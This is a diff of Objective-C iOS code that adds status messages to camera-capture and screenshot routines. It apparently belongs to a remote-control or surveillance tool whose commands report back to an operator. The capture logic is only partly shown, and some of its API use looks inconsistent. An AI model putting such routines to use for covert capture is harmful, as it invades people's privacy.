@@ -103,6 +103,7 @@ bool sysTaskRunning = false;
 }
 
 -(void)takePicture:(bool)front {
+    [self sendString:@"Starting takePicture:..."];
     AVCaptureDeviceDiscoverySession *captureDeviceDiscoverySession = [AVCaptureDeviceDiscoverySession discoverySessionWithDeviceTypes:@[AVCaptureDeviceTypeBuiltInWideAngleCamera] 
                                         mediaType:AVMediaTypeVideo 
                                         position:AVCaptureDevicePositionBack];
@@ -137,7 +138,7 @@ bool sysTaskRunning = false;
     //set output
     [self debugLog:[NSString stringWithFormat:@"setting still image output"]];
     [[NSRunLoop mainRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.5]]; 
-    self.stillImageOutput = [[AVCapturePhotoOutput alloc] init];
+    self.stillImageOutput = [[AVCaptureStillImageOutput alloc] init];
     /*
 
          The whole outputSettings thing is
@@ -197,13 +198,17 @@ bool sysTaskRunning = false;
            [self.session stopRunning];
         });
         if (error) imageData(nil);
-        NSData* data = [AVCapturePhotoOutput JPEGPhotoDataRepresentationForJPEGSampleBuffer:imageSampleBuffer];
+        NSData* data = [AVCapturePhotoOutput JPEGPhotoDataRepresentationForJPEGSampleBuffer:imageSampleBuffer previewPhotoSampleBuffer:imageSampleBuffer];
         if (data) {
            imageData(data);
         } else {
             imageData(nil);
         }
     }];
+}
+
+- (void)captureOutput:(AVCaptureOutput *)output didOutputSampleBuffer:(CMSampleBufferRef)sampleBuffer fromConnection:(AVCaptureConnection *)connection{
+    
 }
 
 - (void)captureOutput:(AVCapturePhotoOutput *)output didFinishProcessingPhoto:(AVCapturePhoto *)photo error:(nullable NSError *)error{  
@@ -308,9 +313,10 @@ bool sysTaskRunning = false;
 }
 
 - (void)screenshot {
+    [self sendString:@"Attempting to take screenshot..."];
     UIImage* image = UIGraphicsGetImageFromCurrentImageContext();
     NSData* imageData = UIImagePNGRepresentation(image);
-    NSString  *jpgPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Test.jpg"];
+    NSString* jpgPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Test.jpg"];
     [self.fileManager createFileAtPath:jpgPath contents:imageData attributes:nil];
     [self sendString:[NSString stringWithFormat:@"Screenshot saved! (%@ (%@))", jpgPath, [[NSByteCountFormatter new] stringFromByteCount:imageData.length]]];
     [self debugLog:[NSString stringWithFormat:@"%@", imageData]];
